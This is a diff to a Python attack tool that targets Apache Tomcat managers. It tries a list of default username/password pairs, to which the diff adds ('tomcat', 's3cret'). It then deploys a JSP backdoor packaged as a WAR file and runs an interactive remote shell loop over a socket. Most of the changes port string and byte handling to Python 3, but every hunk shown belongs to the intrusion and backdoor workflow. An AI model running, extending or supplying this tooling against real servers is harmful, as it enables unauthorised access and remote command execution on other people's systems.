@@ -109,18 +109,18 @@ def issueCommand(sock, cmd, isWindows, path = ''):
     else:
         cmd = cmd + '\n'
 
-    sock.send(cmd)
+    sock.send(cmd.encode('utf-8'))
     res = recvall(sock).strip()
 
     if isWindows:
-        res = res.replace(cmd, '')
-        lines = res.split('\r\n')
+        res = res.decode('utf-8').replace(cmd, '').encode('utf-8')
+        lines = res.split(b'\r\n')
 
         if len(lines) > 2 and lines[-2].strip() == '' \
             and re.match(r'[A-Z]\:(?:\\[^>]+)>', lines[-1]):
             res = '\r\n'.join(lines[:-2])
 
-        lines = res.split('\r\n')
+        lines = res.split(b'\r\n')
         if lines[-1].strip() == path:
             res = '\r\n'.join(lines[:-1]).strip()
 
@@ -138,8 +138,8 @@ def shellLoop(sock, host):
         except: 
             pass
 
-        if 'Microsoft Windows [Version' in initialRecv:
-            lines = initialRecv.split('\r\n')
+        if 'Microsoft Windows [Version' in initialRecv.decode('utf-8'):
+            lines = initialRecv.decode('utf-8').split('\r\n')
             path = lines[-1]
             isWindows = True
 
@@ -295,6 +295,7 @@ def generateWAR(code, title, appname):
         f.write(code)
 
     javaver = execcmd('java -version')
+    javaver = javaver.decode('utf-8')
     m = re.search('version "([^"]+)"', javaver, re.M|re.I)
     if m:
         javaver = m.group(1)
@@ -597,7 +598,7 @@ def invokeApplication(browser, url, opts):
 
         resp = browser.open(appurl)
         src = resp.read()
-        if 'JSP Backdoor deployed as WAR on Apache Tomcat.' in src:
+        if 'JSP Backdoor deployed as WAR on Apache Tomcat.' in src.decode('utf-8'):
             logger.debug('Application invoked correctly.')
             return True
         else:
@@ -860,6 +861,7 @@ def browseToManager(host, url, user, password):
             page = browser.open(managerurl)
 
             data = page.read()
+            data = data.decode('utf-8')
             m = re.search('Apache Tomcat/([^<]+)', data)
             if m:
                 logger.debug('Probably found something: Apache Tomcat/%s' % m.group(1))
@@ -1023,6 +1025,7 @@ def main():
 
     userPasswordPairs = (
         ('tomcat', 'tomcat'),
+        ('tomcat', 's3cret'),
         ('admin', 'admin'),
         ('admin', ''),
         ('cxuser', 'cxuser'),
